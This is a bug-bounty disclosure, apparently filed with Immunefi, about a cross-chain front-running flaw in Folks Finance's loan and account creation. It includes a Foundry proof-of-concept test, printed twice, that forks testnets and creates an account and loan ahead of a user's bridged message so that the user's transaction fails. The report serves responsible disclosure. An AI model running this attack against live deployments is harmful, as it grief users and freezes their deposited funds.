# Boost \_ Folks Finance 33542 - \[Smart Contract - Medium] Attacker can create loan before users tx is

Submitted on Mon Jul 22 2024 22:40:57 GMT-0400 (Atlantic Standard Time) by @cryptoticky for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33542

Report type: Smart Contract

Report severity: Medium

Target: <https://sepolia.etherscan.io/address/0x16Eecb8CeB2CE4Ec542634d7525191dfce587C85>

Impacts:

* Temporary freezing of funds of at least 24h
* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

Attacker can create loan before user's tx is completed through bridge It is similar to Report #33272. <https://bugs.immunefi.com/dashboard/submission/33272>

## Vulnerability Details

When user send the message to bridge, it would be 10+ seconds. So attacker can get the tx information from the source chain and create a loan before the user's tx is completed.

## Impact Details

If user use SpokeCommon.createLoan, user will just loss the gas cost. But if user use SpokeToken.createLoanAndDeposit, the deposited amount will locked in hubChain or spokeToken contract of source chain for a while.

## Recommendation

Same to report 33272.

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/PoC.sol";


interface ISpokeCommon {
    struct MessageParams {
        uint16 adapterId; // where to route message through
        uint16 returnAdapterId; // if applicable, where to route message through for return message
        uint256 receiverValue; // amount of value to attach for receive message
        uint256 gasLimit; // gas limit for receive message
        uint256 returnGasLimit; // if applicable, gas limit for return message
    }

    function createAccount(
        MessageParams memory params,
        bytes32 accountId,
        bytes32 refAccountId
    ) external payable;

    function createLoan(
        MessageParams memory params,
        bytes32 accountId,
        bytes32 loanId,
        uint16 loanTypeId,
        bytes32 loanName
    ) external payable;
}

contract FolksFinance is PoC {
    address public attacker = 0x7039BC43b78A7135F82567C1f973BfAa30F5b8Ab;
    address public user = 0x75C0c372da875a4Fc78E8A37f58618a6D18904e8;

    function setUp() virtual public {
        console.log("\n>>> Initial conditions");
    }

    function testCreateAccount() public {
        vm.createSelectFork("eth_testnet", 6322454);
        vm.startPrank(user);
        ISpokeCommon spokeCommon = ISpokeCommon(0x16Eecb8CeB2CE4Ec542634d7525191dfce587C85);
        ISpokeCommon.MessageParams memory params;
        params.adapterId = 2;
        params.returnAdapterId = 1;
        params.receiverValue = 0;
        params.gasLimit = 201817;
        params.returnGasLimit = 0;

        bytes32 accountId = bytes32(uint256(1));
        bytes32 refAccountId;

        spokeCommon.createAccount{value: 13828150600000000}(params, accountId, refAccountId);
        // User has to pay for gas cost for this tx and fee(the gasLimit for targetChain).

        vm.stopPrank();

        // An attacker can carry out a frontrunning attack
        // The attacker the accountId from the Ethereum network's transaction history and use it to create an account on the HubChain (Avalanche network).
        // This is possible because it takes over 10 seconds to complete the transaction through the bridge.
        vm.createSelectFork("avalanche_testnet", 34872103);
        spokeCommon = ISpokeCommon(0x6628cE08b54e9C8358bE94f716D93AdDcca45b00);
        params.adapterId = 1;
        params.returnAdapterId = 1;
        params.receiverValue = 0;
        params.gasLimit = 0;
        params.returnGasLimit = 0;

        accountId = bytes32(uint256(1));
        spokeCommon.createAccount(params, accountId, refAccountId);
        // Wormhole would send the message after the accountId is created and the tx would be failed.
    }

    function testCreateLoan() public {
        vm.createSelectFork("eth_testnet", 6322454);
        vm.startPrank(user);
        ISpokeCommon spokeCommon = ISpokeCommon(0x16Eecb8CeB2CE4Ec542634d7525191dfce587C85);
        ISpokeCommon.MessageParams memory params;
        params.adapterId = 2;
        params.returnAdapterId = 2;
        params.receiverValue = 0;
        params.gasLimit = 201817;
        params.returnGasLimit = 0;

        bytes32 accountId = bytes32(uint256(1));
        bytes32 refAccountId;

        spokeCommon.createAccount{value: 13828150600000000}(params, accountId, refAccountId);
        vm.warp(block.timestamp + 60);

        bytes32 loanId = bytes32("loan");
        spokeCommon.createLoan{value: 13828150500000000}(params, accountId, loanId, 2, "loanId");
        // User has to pay for gas cost for this tx and fee(the gasLimit for targetChain).

        vm.stopPrank();

        // An attacker can carry out a frontrunning attack
        // The attacker the accountId from the Ethereum network's transaction history and use it to create an account on the HubChain (Avalanche network).
        // This is possible because it takes over 10 seconds to complete the transaction through the bridge.
        vm.createSelectFork("avalanche_testnet", 34872103);

        spokeCommon = ISpokeCommon(0x6628cE08b54e9C8358bE94f716D93AdDcca45b00);

        vm.startPrank(attacker);
        params.adapterId = 1;
        params.returnAdapterId = 1;
        params.receiverValue = 0;
        params.gasLimit = 0;
        params.returnGasLimit = 0;

        accountId = bytes32(uint256(2));
        spokeCommon.createAccount(params, accountId, refAccountId);


        spokeCommon.createLoan(params, accountId, loanId, 2, "loanId");
        vm.stopPrank();
        // Wormhole would send the message after the accountId is created and the tx would be failed.
    }
}
```

## Proof of concept

## Proof of Concept

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/PoC.sol";


interface ISpokeCommon {
    struct MessageParams {
        uint16 adapterId; // where to route message through
        uint16 returnAdapterId; // if applicable, where to route message through for return message
        uint256 receiverValue; // amount of value to attach for receive message
        uint256 gasLimit; // gas limit for receive message
        uint256 returnGasLimit; // if applicable, gas limit for return message
    }

    function createAccount(
        MessageParams memory params,
        bytes32 accountId,
        bytes32 refAccountId
    ) external payable;

    function createLoan(
        MessageParams memory params,
        bytes32 accountId,
        bytes32 loanId,
        uint16 loanTypeId,
        bytes32 loanName
    ) external payable;
}

contract FolksFinance is PoC {
    address public attacker = 0x7039BC43b78A7135F82567C1f973BfAa30F5b8Ab;
    address public user = 0x75C0c372da875a4Fc78E8A37f58618a6D18904e8;

    function setUp() virtual public {
        console.log("\n>>> Initial conditions");
    }

    function testCreateAccount() public {
        vm.createSelectFork("eth_testnet", 6322454);
        vm.startPrank(user);
        ISpokeCommon spokeCommon = ISpokeCommon(0x16Eecb8CeB2CE4Ec542634d7525191dfce587C85);
        ISpokeCommon.MessageParams memory params;
        params.adapterId = 2;
        params.returnAdapterId = 1;
        params.receiverValue = 0;
        params.gasLimit = 201817;
        params.returnGasLimit = 0;

        bytes32 accountId = bytes32(uint256(1));
        bytes32 refAccountId;

        spokeCommon.createAccount{value: 13828150600000000}(params, accountId, refAccountId);
        // User has to pay for gas cost for this tx and fee(the gasLimit for targetChain).

        vm.stopPrank();

        // An attacker can carry out a frontrunning attack
        // The attacker the accountId from the Ethereum network's transaction history and use it to create an account on the HubChain (Avalanche network).
        // This is possible because it takes over 10 seconds to complete the transaction through the bridge.
        vm.createSelectFork("avalanche_testnet", 34872103);
        spokeCommon = ISpokeCommon(0x6628cE08b54e9C8358bE94f716D93AdDcca45b00);
        params.adapterId = 1;
        params.returnAdapterId = 1;
        params.receiverValue = 0;
        params.gasLimit = 0;
        params.returnGasLimit = 0;

        accountId = bytes32(uint256(1));
        spokeCommon.createAccount(params, accountId, refAccountId);
        // Wormhole would send the message after the accountId is created and the tx would be failed.
    }

    function testCreateLoan() public {
        vm.createSelectFork("eth_testnet", 6322454);
        vm.startPrank(user);
        ISpokeCommon spokeCommon = ISpokeCommon(0x16Eecb8CeB2CE4Ec542634d7525191dfce587C85);
        ISpokeCommon.MessageParams memory params;
        params.adapterId = 2;
        params.returnAdapterId = 2;
        params.receiverValue = 0;
        params.gasLimit = 201817;
        params.returnGasLimit = 0;

        bytes32 accountId = bytes32(uint256(1));
        bytes32 refAccountId;

        spokeCommon.createAccount{value: 13828150600000000}(params, accountId, refAccountId);
        vm.warp(block.timestamp + 60);

        bytes32 loanId = bytes32("loan");
        spokeCommon.createLoan{value: 13828150500000000}(params, accountId, loanId, 2, "loanId");
        // User has to pay for gas cost for this tx and fee(the gasLimit for targetChain).

        vm.stopPrank();

        // An attacker can carry out a frontrunning attack
        // The attacker the accountId from the Ethereum network's transaction history and use it to create an account on the HubChain (Avalanche network).
        // This is possible because it takes over 10 seconds to complete the transaction through the bridge.
        vm.createSelectFork("avalanche_testnet", 34872103);

        spokeCommon = ISpokeCommon(0x6628cE08b54e9C8358bE94f716D93AdDcca45b00);

        vm.startPrank(attacker);
        params.adapterId = 1;
        params.returnAdapterId = 1;
        params.receiverValue = 0;
        params.gasLimit = 0;
        params.returnGasLimit = 0;

        accountId = bytes32(uint256(2));
        spokeCommon.createAccount(params, accountId, refAccountId);


        spokeCommon.createLoan(params, accountId, loanId, 2, "loanId");
        vm.stopPrank();
        // Wormhole would send the message after the accountId is created and the tx would be failed.
    }
}
```
